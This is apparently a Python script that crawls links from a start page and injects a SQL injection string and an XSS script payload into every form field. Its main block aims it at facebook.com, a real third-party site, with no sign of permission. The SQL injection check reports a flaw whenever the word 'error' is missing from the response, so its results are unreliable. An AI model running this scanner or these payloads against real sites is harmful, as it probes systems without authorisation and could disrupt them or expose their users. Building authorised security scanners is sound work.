import requests
from bs4 import BeautifulSoup
import json


class Crawler:
    def __init__(self, base_url):
        self.base_url = base_url
        self.report = []

    # Fetches urls from the base_url
    def crawl(self):
        urls = set()
        response = requests.get(self.base_url)
        soup = BeautifulSoup(response.text, 'html.parser')

        for link in soup.find_all('a'):
            href = link.get('href')
            if href and href.startswith('http'):
                urls.add(href)
        return urls

    # Fetches forms from a given url
    def extract_forms(self, url):
        forms = []
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')

        for form in soup.find_all('form'):
            forms.append(form)
        return forms

    # Function for making request
    def make_request(self, url, form, payload):
        method = form.get('method', 'get').lower()
        action = form.get('action', '')
        inputs = form.find_all('input')
        data = {input.get('name'): payload for input in inputs}

        if method == 'post':
            return requests.post(url + action, data=data)
        else:
            return requests.get(url + action, params=data)


class VulnerabilityTester(Crawler):
    # Tests for SQL Injection vulnerability 
    def test_sql_injection(self, url, form):
        injection_payload = "' OR '1'='1"

        response = self.make_request(url, form, injection_payload)

        if "error" not in response.text.lower():
            self.report.append({'url': url, 'vulnerability': 'SQL Injection'})

    # Tests for XSS vulnerability 
    def test_xss(self, url, form):
        xss_payload = "<script>alert('XSS')</script>"

        response = self.make_request(url, form, xss_payload)

        if xss_payload in response.text:
            self.report.append({'url': url, 'vulnerability': 'XSS'})


if __name__ == "__main__":
    vTester = VulnerabilityTester('http://facebook.com')
    discovered_urls = vTester.crawl()

    for url in discovered_urls:
        forms = vTester.extract_forms(url)
        for form in forms:
            vTester.test_sql_injection(url, form)
            vTester.test_xss(url, form)

    with open('report.json', 'w') as f:
        json.dump(vTester.report, f, indent=4)

    print('Report generated: report.json')
